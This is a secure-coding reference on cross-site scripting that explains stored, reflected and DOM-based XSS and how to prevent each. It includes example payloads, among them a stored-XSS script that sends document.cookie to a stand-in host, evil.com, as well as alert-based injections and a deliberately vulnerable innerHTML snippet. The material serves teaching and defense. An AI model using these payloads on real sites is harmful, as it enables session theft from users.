### XSS: Cross-Site Scripting (Stored, Reflected, DOM)

**What XSS is:**
- Attacker injects malicious JavaScript into a web page viewed by other users
- Can steal cookies/sessions, redirect users, deface pages, keylog

**Three types:**

**1. Stored (Persistent) — most dangerous:**
- Malicious script saved in the database (comment, profile, message)
- Every user who views the page executes the script
```
Attacker posts comment: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
Stored in DB, rendered to all viewers without escaping.
```

**2. Reflected (Non-persistent):**
- Malicious script in URL/request, reflected in response
- Requires victim to click a crafted link
```
https://example.com/search?q=<script>alert('XSS')</script>
Server renders: "Results for: <script>alert('XSS')</script>"
```

**3. DOM-based:**
- Vulnerability in client-side JavaScript (no server involvement)
- Unsafe use of `innerHTML`, `document.write`, `eval()`
```javascript
// Vulnerable
document.getElementById('output').innerHTML = location.hash.substring(1);
// URL: https://example.com/#<img src=x onerror=alert('XSS')>
```

**Prevention:**

**1. Output encoding (context-aware escaping):**
```
HTML context: &lt;script&gt; (encode < > & " ')
JavaScript context: \x3cscript\x3e
URL context: %3Cscript%3E
CSS context: \3C script\3E
```
- Frameworks do this by default: Rails `<%= %>`, React JSX, Vue `{{ }}`
- Dangerous escapes: Rails `raw()`, `html_safe`, React `dangerouslySetInnerHTML`

**2. Content Security Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```
- Blocks inline scripts (`<script>alert()</script>` won't execute)
- Blocks `eval()` and other dynamic code execution
- Whitelist trusted script sources only

**3. Input sanitization (for rich text):**
- When you MUST allow HTML (CMS, comments with formatting)
- Use allowlist-based sanitizer: DOMPurify (JS), Sanitize gem (Ruby), Bleach (Python)
- Strip all tags except explicitly allowed (`<b>`, `<i>`, `<a>`)
- NEVER use blocklist (too many bypass techniques)

**4. HttpOnly cookies:**
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
- `HttpOnly` prevents JavaScript from reading the cookie
- XSS can't steal session cookies (but can still make authenticated requests)

**5. Avoid dangerous APIs:**
```javascript
// DANGEROUS — avoid these with user input
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput, 0);
new Function(userInput);

// SAFE alternatives
element.textContent = userInput;  // treats as text, not HTML
```

**Rule of thumb:** Escape output by context (HTML, JS, URL). Use CSP to block inline scripts. HttpOnly cookies to protect sessions. Never use `innerHTML` or `dangerouslySetInnerHTML` with user input. Frameworks (React, Rails) escape by default — the danger is when you bypass the default.
